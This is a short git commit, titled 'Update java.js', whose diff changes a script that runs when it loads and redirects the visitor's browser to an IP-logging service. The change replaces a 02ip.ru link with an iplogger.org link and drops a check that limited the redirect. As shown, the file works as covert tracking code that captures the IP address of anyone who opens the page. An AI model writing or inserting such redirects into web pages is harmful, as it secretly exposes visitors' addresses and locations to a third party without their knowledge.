6dd8fbdf541a5afe190655ce7d7a37cdbbfbf3f0
weboca <97624815+weboca@users.noreply.github.com>
2022-01-12 20:26:06 +0200

    Update java.js

--- java.js
+++ java.js
@@ -1,9 +1,5 @@
 var wind = () => {
-  if (n==1) {
-    return
-  }
-  document.location.href = 'https://02ip.ru/2Dxym6'
-  n=1;
+  document.location.href = 'https://iplogger.org/2Dxym6'
 }
 
 wind()
